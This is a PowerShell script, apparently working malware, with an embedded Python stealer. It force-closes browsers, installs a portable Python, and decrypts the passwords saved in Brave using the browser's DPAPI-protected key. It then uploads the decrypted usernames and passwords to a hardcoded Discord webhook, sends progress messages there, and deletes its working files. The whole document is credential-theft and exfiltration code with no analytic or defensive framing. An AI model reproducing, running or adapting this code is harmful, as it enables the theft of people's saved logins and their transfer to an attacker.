$wh="https://discord.com/api/webhooks/1467597897435582594/wbqYsXdKoKB124ig5QJCGBBb88kmkTUpEKGEq0A6oZ-81uZ0ecgtHM-D8Zq44U7uh_8W"

function Send {
    param([string]$m)
    Invoke-RestMethod -Uri $wh -Method Post -Body (@{content=$m}|ConvertTo-Json) -ContentType "application/json"|Out-Null
}

Send "🚀 Starting full install + decrypt..."

Get-Process brave,msedge,chrome -EA 0|Stop-Process -Force -EA 0
Start-Sleep 5

cd $env:TEMP

# Vérifier si Python portable existe déjà
if (!(Test-Path "$env:TEMP\py\python.exe")) {
    Send "📥 Installing Python portable..."
    
    [Net.ServicePointManager]::SecurityProtocol='Tls12'
    Invoke-WebRequest "https://www.python.org/ftp/python/3.11.9/python-3.11.9-embed-amd64.zip" -OutFile "py.zip" -UseBasicParsing
    Expand-Archive "py.zip" "py" -Force
    (Get-Content "py\python311._pth") -replace '#import site','import site'|Out-File "py\python311._pth" -Encoding ascii
    Invoke-WebRequest "https://bootstrap.pypa.io/get-pip.py" -OutFile "py\gp.py" -UseBasicParsing
    
    cd py
    .\python.exe gp.py --no-warn-script-location 2>$null
    .\python.exe -m pip install pycryptodome pypiwin32 --quiet 2>$null
    cd ..
    
    Remove-Item py.zip -Force
    
    Send "✅ Python installed"
} else {
    Send "✅ Python already installed"
}

cd "$env:TEMP\py"

# Script Python pour Brave v20
$script = @'
import os,json,base64,win32crypt,sqlite3,shutil
from Crypto.Cipher import AES

wh="https://discord.com/api/webhooks/1467597897435582594/wbqYsXdKoKB124ig5QJCGBBb88kmkTUpEKGEq0A6oZ-81uZ0ecgtHM-D8Zq44U7uh_8W"

def send(m):
    import subprocess
    subprocess.run(["powershell","-C",f"Invoke-RestMethod -Uri '{wh}' -Method Post -Body (@{{content='{m[:1900]}'}}|ConvertTo-Json) -ContentType 'application/json'"],capture_output=True,shell=True)

send("Python script starting...")

b=os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data")
ld=b+r"\Default\Login Data"
ls=b+r"\Local State"

# Vérifier que Brave est installé
if not os.path.exists(ld):
    send("Brave not installed")
    exit()

with open(ls) as f:
    enc_key=base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:]
    key=win32crypt.CryptUnprotectData(enc_key,None,None,None,0)[1]

send(f"Key: {len(key)}B")

shutil.copy2(ld,"temp.db")
c=sqlite3.connect("temp.db")

results=[]
v20_count=0

for url,user,enc_pwd in c.execute("SELECT origin_url,username_value,password_value FROM logins WHERE username_value!=''"):
    
    if enc_pwd[:3] == b'v20':
        v20_count+=1
        results.append(f"[BRAVE-v20-ENCRYPTED] {url}\nUser: {user}\nPass: [Cannot decrypt v20 offline]\n")
    else:
        try:
            nonce=enc_pwd[3:15]
            cipher=AES.new(key,AES.MODE_GCM,nonce=nonce)
            pwd=cipher.decrypt_and_verify(enc_pwd[15:-16],enc_pwd[-16:]).decode()
            results.append(f"[BRAVE] {url}\nUser: {user}\nPass: {pwd}\n")
        except:
            results.append(f"[BRAVE-ERROR] {url}\nUser: {user}\nPass: [Decrypt failed]\n")

c.close()
os.remove("temp.db")

send(f"Total: {len(results)} | v20 encrypted: {v20_count}")

if results:
    with open("passwords.txt","w",encoding="utf-8") as f:
        f.write("\n".join(results))
    print("OK")
else:
    print("NONE")
'@

$script | Out-File "decrypt.py" -Encoding UTF8

$result = .\python.exe decrypt.py 2>&1

foreach ($line in $result) {
    Send $line
}

if (Test-Path "passwords.txt") {
    curl.exe -F "file=@passwords.txt" $wh
    Remove-Item passwords.txt
} else {
    Send "❌ No passwords file created"
}

Remove-Item decrypt.py -Force

Send "🏁 Finished"
